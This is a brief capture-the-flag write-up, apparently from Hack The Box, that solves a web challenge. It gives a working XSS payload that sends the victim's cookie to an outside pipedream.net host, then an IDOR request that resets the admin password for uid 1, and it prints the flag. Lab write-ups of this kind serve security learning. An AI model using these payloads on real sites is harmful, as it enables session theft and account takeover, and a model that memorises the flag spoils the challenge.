Form triggers a bot to view the page so we can use XSS to exfil the cookie
```html
<script>fetch("https://eocudzg2el9ut46.m.pipedream.net/?"+ document.cookie)</script>
```

Setting the session cookie and going to /admin will give us the mod panel, from there there is a settings link allowing us to reset passwords for a uid, manipulate the request to reset for uid 1 to reset admin

```
POST /api/users/update
{
	"password":"test",
	"uid":"1"
}
```

Logging into the reset `admin` account gives us the flag
```
HTB{x55_4nd_id0rs_ar3_fun!!}
```